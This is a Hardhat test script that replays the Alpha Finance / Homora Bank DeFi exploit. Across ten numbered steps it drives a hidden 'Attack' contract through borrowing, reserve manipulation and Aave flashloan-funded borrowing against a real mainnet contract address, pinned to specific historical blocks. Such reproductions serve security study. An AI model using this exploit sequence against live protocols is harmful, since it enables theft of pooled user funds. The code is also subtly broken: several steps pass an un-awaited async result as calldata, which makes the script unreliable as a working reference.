const { mine, time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { parseUnits } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Alpha Finance Attack", function () {
    const sUSD = "0x57Ab1ec28D129707052df4dF418D58a2D46d5f51";
    const ETHamount = parseUnits("1.5", 18);
    let attack, homoraBank;

    async function deployContractFixture() {
        // Contracts are deployed using the first signer/account by default
        const [attacker, ...addrs] = await ethers.getSigners();

        const Attack = await ethers.getContractFactory("Attack");
        attack = await Attack.deploy();

        homoraBank = await ethers.getContractAt("IHomoraBank", "0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb");

        return { attacker, attack };
    }

    describe("Exploiter Attack", function () {
        before(async () => {
            await loadFixture(deployContractFixture);
        });

        it("# step 2 : Swap and Add Liquidity", async function () {
            // from block number 11846579 to start
            await attack.attack2({ value: ETHamount });
        });

        it("# step 3 : Borrow ", async function () {
            // add blocks to finish block number is 11846605
            await mine(24);
            let data = await abiEncodeWithSignature("execute3(uint256)", ["uint"], [1000]);

            await homoraBank.execute(0, attack.address, data);
        });

        it("# step 4 : Repay", async function () {
            // add blocks to finish block number is 11846608
            await mine(2);

            let data = await abiEncodeWithSignature("execute4()");
            await homoraBank.execute(883, attack.address, data);
        });

        it("# step 5 : Call resolveReserve", async () => {
            // add blocks to finish block number is 11846612
            await mine(3);

            await homoraBank.resolveReserve(sUSD);
        });

        it("# step 6 : Borrow more", async () => {
            // add blocks to finish block number is 11846618
            await mine(5);
            let data = abiEncodeWithSignature("execute6(uint256)", ["uint"], [16]);
            await homoraBank.execute(0, attack.address, data);
        });

        it("# step 7 : Repeat step 6 to borrow more", async () => {
            // add blocks to finish block number is 11846623
            await mine(4);
            let data = abiEncodeWithSignature("execute6(uint256)", ["uint"], [10]);
            await homoraBank.execute(0, attack.address, data);
        });

        it("# step 8 : Flashloan from AAVE and continue borrow from homoraBank", async () => {
            // add blocks to finish block number is 11846627
            await mine(3);
            let data = abiEncodeWithSignature("execute8(uint256,uint256)", ["uint", "uint"], [10, 1800000000000]);
            await homoraBank.execute(0, attack.address, data);
        });

        it("# step 9 : repeat step 8 to flashloan from AAVE and continue borrow from homoraBank", async () => {
            // add blocks to finish block number is 11846631
            await mine(3);
            let data = abiEncodeWithSignature("execute8(uint256,uint256)", ["uint", "uint"], [7, 10000000000000]);
            await homoraBank.execute(0, attack.address, data);
        });

        it("# step 10 : repeat step 9 to flashloan from AAVE and continue borrow from homoraBank", async () => {
            // add blocks to finish block number is 11846641
            await mine(9);
            let data = abiEncodeWithSignature("execute8(uint256,uint256)", ["uint", "uint"], [2, 10000000000000]);
            await homoraBank.execute(0, attack.address, data);
        });
    });
});

async function abiEncodeWithSignature(_functionName, ..._params) {
    if (_params.length > 0) {
        let bytes = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(_functionName));
        let selector = bytes.slice(0, 10);

        let params = ethers.utils.defaultAbiCoder.encode(_params[0], _params[1]);
        params = params.slice(2);

        let data = selector + params;
        return data;
    } else {
        let bytes = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(_functionName));
        let selector = bytes.slice(0, 10);

        return selector;
    }
}
